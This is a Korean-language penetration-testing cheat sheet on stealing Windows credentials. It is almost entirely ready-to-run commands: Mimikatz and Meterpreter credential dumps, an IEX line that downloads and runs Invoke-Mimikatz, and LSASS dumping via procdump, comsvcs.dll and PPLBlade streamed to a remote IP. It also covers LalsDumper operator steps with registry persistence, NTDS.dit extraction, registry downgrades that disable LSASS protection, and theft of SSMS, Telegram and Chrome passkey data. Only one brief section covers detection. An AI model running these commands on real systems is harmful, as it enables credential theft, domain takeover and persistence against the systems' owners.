# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## 자격 증명 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz로 할 수 있는 다른 작업은** [**this page**](credentials-mimikatz.md)**에서 확인하세요.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**여기에서 몇 가지 가능한 자격 증명 보호 방법을 알아보세요.**](credentials-protections.md) **이러한 보호 방법은 Mimikatz가 일부 자격 증명을 추출하지 못하게 할 수 있습니다.**

## Meterpreter의 자격 증명

피해자 내부에서 **비밀번호와 해시를 검색하려면** 제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하세요.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV 우회

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 **Procdump는 합법적인 Microsoft 도구**이므로 Defender에서 탐지되지 않습니다.\
이 도구를 사용해 **lsass 프로세스를 덤프**하고, **덤프 파일을 다운로드**한 다음, 덤프에서 **자격 증명을 로컬에서 추출**할 수 있습니다.

[SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용해 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용해 lsass.exe를 덤프하는 행위**를 **악성으로 탐지**할 수 있습니다. 이는 **"procdump.exe" 및 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 procdump에 **lsass.exe라는 이름 대신** lsass.exe의 **PID를 인수로 전달하는** 편이 **더 은밀합니다.**

### **comsvcs.dll을 사용해 lsass 덤프하기**

`C:\Windows\System32`에서 찾을 수 있는 **comsvcs.dll**이라는 DLL은 충돌이 발생했을 때 **프로세스 메모리를 덤프**하는 역할을 합니다. 이 DLL에는 **`MiniDumpW`**라는 **함수**가 포함되어 있으며, 이 함수는 `rundll32.exe`를 사용해 호출하도록 설계되었습니다.\
처음 두 인수는 어떤 값을 사용해도 상관없지만, 세 번째 인수는 세 부분으로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 부분이고, 덤프 파일 위치가 두 번째 부분이며, 세 번째 부분에는 반드시 **full**이라는 단어를 지정해야 합니다. 다른 옵션은 사용할 수 없습니다.\
이 세 부분을 파싱한 뒤 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 해당 파일로 전송합니다.\
**comsvcs.dll**을 사용하면 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에서 자세히 설명합니다.<sup>[[9]](#references)</sup>

다음 명령을 실행합니다:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**이 프로세스는** [**lssasy**](https://github.com/Hackndo/lsassy)**를 사용해 자동화할 수 있습니다.**

### **Task Manager로 lsass 덤프하기**

1. Task Bar를 마우스 오른쪽 버튼으로 클릭하고 Task Manager를 클릭합니다.
2. More details를 클릭합니다.
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 Microsoft에서 서명한 바이너리로, [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 제품군에 포함되어 있습니다.

이미 생성된 전체 시스템 크래시 덤프나 접근 가능한 사용자 폴더에 압축된 사본에는 오프라인 분석에 필요한 자격 증명 자료가 남아 있을 수 있습니다. `MEMORY.DMP` 및 `MEMORY.7z`와 같은 파일 이름은 검토를 위한 단서일 뿐입니다. 출처와 접근 권한을 확인하고, 사용 가능한 최신 자격 증명이 포함되어 있다고 단정하지 마세요.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade로 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 덤프를 난독화하고 디스크에 저장하지 않은 채 원격 워크스테이션으로 전송할 수 있는 Protected Process Dumper Tool입니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 시그니처 기반 탐지 메커니즘을 회피하기 위해 메모리 덤프 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB 업로드 방식으로 메모리 덤프 업로드(파일리스 덤프)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump를 사용하지 않는 SSP 기반 LSASS 덤프

Ink Dragon은 `MiniDumpWriteDump`를 호출하지 않아 해당 API에 설정된 EDR 후크가 작동하지 않는 3단계 dumper인 **LalsDumper**를 사용합니다:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 소문자 `d` 32개로 이루어진 placeholder를 찾아 `rtu.txt`의 절대 경로로 덮어쓰고, 패치된 DLL을 `nfdp.dll`로 저장한 다음 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이로 인해 **LSASS**가 악성 DLL을 새 Security Support Provider (SSP)로 로드합니다.
2. **LSASS 내부 Stage 2** – LSASS가 `nfdp.dll`을 로드하면 DLL은 `rtu.txt`를 읽고 각 바이트에 `0x20`을 XOR한 뒤, 디코딩된 blob을 메모리에 매핑하고 실행을 넘깁니다.
3. **Stage 3 dumper** – 매핑된 payload는 해시된 API 이름에서 확인한 **direct syscalls**를 사용해 MiniDump 로직을 재구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열고, 압축된 LSASS dump를 파일에 기록한 다음 핸들을 닫아 이후 exfiltration이 가능하도록 합니다.

운영자 참고 사항:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 디렉터리에 두세요. Stage 1은 하드코딩된 placeholder를 `rtu.txt`의 절대 경로로 바꾸므로, 파일을 분리하면 체인이 작동하지 않습니다.
* `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가해 등록합니다. 해당 값을 직접 설정하면 LSASS가 부팅할 때마다 SSP를 다시 로드하도록 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 dump입니다. 로컬에서 압축을 푼 다음 Mimikatz/Volatility에 넣어 credential extraction을 수행하세요.
* `AddSecurityPackageA`가 성공하려면 `lals.exe`를 admin/SeTcb 권한으로 실행해야 합니다. 호출이 반환되면 LSASS가 rogue SSP를 투명하게 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 제거해도 LSASS에서 언로드되지는 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작하거나(재부팅), 장기 persistence를 위해 그대로 두세요.

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 대상 DC에서 NTDS.dit Dump

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### 대상 DC에서 NTDS.dit 암호 기록 덤프

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 각 NTDS.dit 계정의 pwdLastSet 특성 표시

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM 및 SYSTEM 탈취

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM._에 **위치**해야 합니다. 하지만 보호되어 있으므로 **일반적인 방식으로 복사할 수는 없습니다.**

### 레지스트리에서

이 파일들을 가져오는 가장 쉬운 방법은 레지스트리에서 사본을 얻는 것입니다:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**다운로드**한 파일을 Kali 머신으로 가져와 다음을 사용해 **해시를 추출하세요**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### 볼륨 섀도 복사본

이 서비스를 사용해 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

하지만 **Powershell**에서도 동일하게 할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예입니다(사용하는 드라이브는 "C:"이고 파일은 C:\users\Public에 저장됩니다). 이 방법은 보호된 파일을 복사하는 데도 사용할 수 있습니다:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

책의 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

마지막으로, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용해 SAM, SYSTEM, ntds.dit의 복사본을 만들 수도 있습니다.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory 자격 증명 - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며, 사용자 개체, 그룹 및 그룹 구성원에 관한 중요한 데이터를 보유합니다. 도메인 사용자의 **password hash**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 있습니다.

이 데이터베이스에는 세 개의 주요 테이블이 유지됩니다.

- **Data Table**: 사용자 및 그룹과 같은 개체의 세부 정보를 저장합니다.
- **Link Table**: 그룹 구성원 관계와 같은 연결 관계를 추적합니다.
- **SD Table**: 각 개체의 **security descriptor**를 보관하여 저장된 개체의 보안과 액세스 제어를 보장합니다.

Christoffer Andersson의 데이터베이스 계층 연구에서는 이러한 테이블과 버전별 동작을 더 자세히 다룹니다.<sup>[[8]](#references)</sup>

Windows는 _Ntdsa.dll_을 사용해 해당 파일과 상호 작용하며, _lsass.exe_가 이를 사용합니다. 따라서 **NTDS.dit** 파일의 **일부**가 **`lsass` 메모리 내부에** 있을 수 있습니다(성능 향상을 위해 **cache**를 사용하기 때문에 가장 최근에 액세스한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 해시 복호화

해시는 세 번 암호화됩니다.

1. **BOOTKEY**와 **RC4**를 사용해 Password Encryption Key (**PEK**)를 복호화합니다.
2. **PEK**와 **RC4**를 사용해 **hash**를 복호화합니다.
3. **DES**를 사용해 **hash**를 복호화합니다.

**PEK**는 모든 도메인 컨트롤러에서 **같은 값**이지만, 해당 도메인 컨트롤러의 **SYSTEM** hive에 있는 DC별 **BOOTKEY**로 **암호화**된 상태로 **NTDS.dit** 내부에 저장됩니다. 따라서 자격 증명을 추출하려면 **NTDS.dit**와 **SYSTEM**(`C:\Windows\System32\config\SYSTEM`)이 모두 필요합니다.

### Ntdsutil을 사용해 NTDS.dit 복사하기

Windows Server 2008부터 사용할 수 있습니다.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](#stealing-sam-and-system) 기법을 사용해 **ntds.dit** 파일을 복사할 수도 있습니다. **SYSTEM file** 사본도 필요하다는 점을 기억하세요(다시 말해, [**레지스트리에서 덤프하거나 volume shadow copy 기법을 사용하세요**](#stealing-sam-and-system)).

### **NTDS.dit에서 해시 추출하기**

**NTDS.dit**와 **SYSTEM** 파일을 **확보한** 후에는 _secretsdump.py_와 같은 도구를 사용해 **해시를 추출**할 수 있습니다:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

유효한 도메인 관리자 계정을 사용해 **자격 증명을 자동으로 추출할 수도 있습니다**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**큰 NTDS.dit 파일**은 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용해 추출하는 것을 권장합니다.

마지막으로 **metasploit module** `post/windows/gather/credentials/domain_hashdump` 또는 **mimikatz** `lsadump::lsa /inject`도 사용할 수 있습니다.

### **NTDS.dit에서 도메인 객체를 추출해 SQLite 데이터베이스에 저장하기**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하면 NTDS 객체를 SQLite 데이터베이스로 추출할 수 있습니다. secrets뿐 아니라 객체 전체와 해당 속성도 추출하므로, 원본 NTDS.dit 파일을 이미 가져온 경우 추가 정보를 추출하는 데 활용할 수 있습니다.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` 하이브는 선택 사항이지만 secrets 복호화를 허용합니다(NT 및 LM 해시, 평문 비밀번호와 같은 보조 자격 증명, kerberos 또는 trust 키, NT 및 LM 비밀번호 기록). 그 밖에도 다음 데이터를 추출합니다: 해시가 포함된 사용자 및 머신 계정, UAC 플래그, 마지막 로그인 및 비밀번호 변경 시각, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, trust 유형, 방향, 속성이 포함된 trusted domain...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 바이너리를 다운로드하세요. 이 바이너리를 사용해 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.

```
lazagne.exe all
```

## SAM 및 LSASS에서 자격 증명을 추출하는 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 여기에서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명 추출하기

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM 파일에서 자격 증명 추출

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

[http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)에서 다운로드한 다음 **실행하기만 하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 수집 및 보안 제어 약화

Ink Dragon의 FinalDraft RAT에는 `DumpRDPHistory` tasker가 포함되어 있으며, 이 기법은 모든 red-teamer에게 유용합니다:<sup>[[3]](#references)</sup>

### DumpRDPHistory 스타일의 텔레메트리 수집

* **아웃바운드 RDP 대상** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`의 모든 사용자 하이브를 파싱합니다. 각 하위 키에는 서버 이름, `UsernameHint`, 마지막 쓰기 타임스탬프가 저장됩니다. PowerShell로 FinalDraft의 로직을 재현할 수 있습니다:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **인바운드 RDP 증거** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 이벤트 ID **21**(성공한 로그온)과 **25**(연결 해제)를 조회해 누가 시스템을 관리했는지 파악합니다:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

연결을 자주 하는 Domain Admin이 누구인지 파악했다면, 해당 사용자의 **연결이 끊긴** 세션이 아직 남아 있는 동안 LalsDumper/Mimikatz로 LSASS를 덤프하세요. CredSSP + NTLM fallback으로 인해 해당 사용자의 verifier와 토큰이 LSASS에 남으며, 이를 SMB/WinRM을 통해 재사용해 `NTDS.dit`를 가져오거나 도메인 컨트롤러에 persistence를 구축할 수 있습니다.

### FinalDraft가 노리는 레지스트리 다운그레이드

이 implant는 자격 증명 탈취를 더 쉽게 하려고 여러 레지스트리 키도 변조합니다:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1`을 설정하면 RDP 중 자격 증명/티켓을 완전히 재사용하게 되어 pass-the-hash 방식의 피벗이 가능해집니다.
* `LocalAccountTokenFilterPolicy=1`은 UAC 토큰 필터링을 비활성화하여 로컬 관리자에게 네트워크를 통한 제한 없는 토큰을 부여합니다.
* `DSRMAdminLogonBehavior=2`를 설정하면 DC가 온라인 상태일 때 DSRM 관리자 계정으로 로그온할 수 있어 공격자가 사용할 수 있는 또 다른 기본 제공 고권한 계정이 생깁니다.
* `RunAsPPL=0`은 LSASS PPL 보호를 제거하여 LalsDumper와 같은 덤프 도구가 메모리에 쉽게 접근할 수 있게 합니다.

## hMailServer 설정 자격 증명 (post-compromise)

설치 레이아웃에 따라 정확한 설정 파일 `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, `C:\ProgramData\hMailServer\hMailServer.ini`을 확인합니다. 읽을 수 있고 비어 있지 않은 `[Security] AdministratorPassword=` 값은 hMailServer 관리 비밀번호 해시이며, Windows Administrator 비밀번호의 증거가 아닙니다. 해당 자격 증명을 복구하더라도 Windows 계정으로 피벗하려면 비밀번호 재사용 여부와 로그온 권한을 별도로 검증해야 합니다.

SQL CE 데이터베이스를 사용하는 설치의 경우, INI 파일의 별도 `[Database] Password=` 값이 데이터베이스를 보호합니다. 레거시 설치에서는 이 값이 정적 키 `THIS_KEY_IS_NOT_SECRET` 및 4바이트 워드 엔디언 스왑을 사용해 Blowfish로 암호화됩니다. INI 파일의 16진수 문자열을 다음 Python 코드에 사용합니다:<sup>[[2]](#references)</sup>

먼저 현재 계정으로 INI 파일과 해당 SQL CE `.sdf` 데이터베이스를 **모두** 읽을 수 있는지 확인합니다. INI 비밀번호는 데이터베이스를 보호하며, 데이터베이스 내부에 저장된 메일박스 계정 해시와는 별개입니다. 사용 중인 데이터베이스는 라이브 파일이 아닌 **복사본**을 검사하거나 업그레이드합니다.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

평문 비밀번호를 사용해 파일 잠금을 피하도록 SQL CE 데이터베이스를 복사하고, 32비트 provider를 로드한 다음 필요하면 업그레이드한 후 해시를 조회합니다:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

The `accountpassword` 열은 hMailServer 해시 형식(`hashcat` 모드 `1421`)을 사용합니다. 크랙한 메일박스 비밀번호를 Windows 사용자 계정으로 피벗하는 것은 해당 비밀번호를 로컬/도메인 계정에서도 재사용하고, 그 계정에 필요한 원격 로그온 권한이 있는 경우에만 가능합니다.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

일부 도구는 LSA 로그온 콜백 `LsaApLogonUserEx2`를 가로채 **평문 로그온 비밀번호**를 캡처합니다. 인증 패키지 콜백을 후킹하거나 래핑해 자격 증명을 **로그온 중에** (해시되기 전에) 캡처한 다음 디스크에 기록하거나 운영자에게 반환하는 방식입니다. 일반적으로 LSA에 인젝션하거나 LSA에 등록하는 도우미를 구현해, 성공한 각 대화형/네트워크 로그온 이벤트의 사용자 이름, 도메인, 비밀번호를 기록합니다.<sup>[[1]](#references)</sup>

운영상 참고 사항:
- 인증 경로에서 도우미를 로드하려면 로컬 관리자/SYSTEM 권한이 필요합니다.
- 캡처된 자격 증명은 로그온이 발생할 때만 나타납니다. 후킹 방식에 따라 대화형, RDP, 서비스 또는 네트워크 로그온일 수 있습니다.

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS)는 저장된 연결 정보를 사용자별 `sqlstudio.bin` 파일에 저장합니다. 전용 덤퍼를 사용하면 파일을 파싱해 저장된 SQL 자격 증명을 복구할 수 있습니다. 명령 출력만 반환하는 셸에서는 파일을 Base64로 인코딩해 stdout에 출력하는 방식으로 유출하는 경우가 많습니다.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

operator 측에서 파일을 다시 빌드하고 dumper를 로컬에서 실행해 자격 증명을 복구합니다.

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Telegram Desktop `tdata` 세션 탈취

Telegram Desktop은 인증 정보와 계정 상태를 **`tdata`** 디렉터리에 저장합니다. 복사한 세션은 호환되는 도구로 불러와 해당 인증이 유효한 동안 계정 비밀번호 없이 인증하는 데 사용할 수 있습니다. 로컬 데이터 암호화가 활성화되어 있다면 탈취 도구에는 암호도 필요합니다. 인증된 세션을 통해 신원 데이터, 대화 및 멤버십 메타데이터, 메시지, 다운로드 가능한 미디어에 접근할 수 있습니다.<sup>[[10]](#references)</sup>

### 검색 및 획득

설치형 및 포터블 레이아웃을 모두 검색하세요. Microsoft Store 패키지 이름은 다를 수 있으므로 `TelegramMessenge`가 포함된 패키지 디렉터리를 열거하고 해당 디렉터리의 `LocalCache\Roaming` 하위 트리를 살펴보세요.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

일반적인 읽기 작업이 실패하고 프로세스 토큰에 `SeBackupPrivilege`가 **이미 포함되어 활성화된 경우**, 백업 인식 액세스를 대안으로 사용할 수 있습니다. 이 방식은 권한을 획득하거나 프로세스를 상승시키지 않습니다. `FILE_FLAG_BACKUP_SEMANTICS`를 사용한 `CreateFileW`는 필요한 토큰 권한이 있을 때 백업/복원 의미 체계를 요청하고 파일 보안 검사를 우회할 수 있지만, 이 플래그만으로 호환되지 않는 공유 잠금을 무력화할 수는 없습니다.<sup>[[10]](#references)[[11]](#references)</sup>

사용 중인 잠긴 파일에는 **Volume Shadow Copy**를 생성하고 읽습니다. ACL로 접근이 차단된 파일에는 `robocopy /B`를 사용하면 백업 모드로 작동하여 파일 및 디렉터리 ACL을 우회합니다.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

대역폭을 고려하는 implant는 먼저 파일 경로 목록만 제출하고, C2에 이미 저장된 경로와 스냅샷 식별자를 받은 다음 누락된 파일만 업로드할 수 있습니다. 따라서 `tdata`를 재귀적으로 열거한 뒤 소량씩 전송하더라도 세션 탈취에 성공했을 수 있습니다.<sup>[[10]](#references)</sup>

### 탐지 및 차단

Telegram이 아닌 프로세스의 `tdata` 재귀 접근을 `SeBackupPrivilege` 활성화, backup-semantics 파일 열기, VSS 활동 또는 `/B`를 사용하는 자식 `robocopy.exe` 프로세스와 연관 지어 조사하세요. 또한 `%APPDATA%`와 `%LOCALAPPDATA%\Packages`를 빠르게 열거한 뒤 같은 프로세스에서 외부 연결이 발생하는지도 탐지하세요. 침해 후에는 **설정 → 기기**(또는 **개인 정보 및 보안 → 활성 세션**)에서 인식할 수 없는 세션을 종료하세요. 2단계 인증을 활성화해도 이미 탈취된 인증은 해제되지 않습니다.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows의 Chrome에서 발생하는 Passkeys / WebAuthn 자격 증명 탈취

**Google Password Manager와 동기화된 passkeys를 사용하는 Chrome**이 설치된 Windows 호스트에서 **피해자 사용자** 권한으로 코드 실행을 확보했다면, **admin/SYSTEM 권한이 없어도** passkeys는 흥미로운 post-exploitation 대상이 됩니다.<sup>[[4]](#references)</sup>

### 흥미로운 로컬 아티팩트

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**에는 protobuf로 인코딩된 **`WebauthnCredentialSpecifics`** 레코드가 저장됩니다. 동일 사용자의 프로세스는 동기화된 passkey의 **RP ID**, **사용자 이름**, **credential ID**, 암호화된 개인 키 자료를 열거할 수 있습니다.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**에는 **`wrapped_identity_private_key`**와 동기화된 자격 증명을 복구하는 데 사용되는 래핑된 비밀 값 등 로컬 장치 등록 상태가 저장됩니다.<sup>[[4]](#references)</sup>

빠른 점검:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blob은 여전히 로컬 signing oracle로 악용될 수 있음

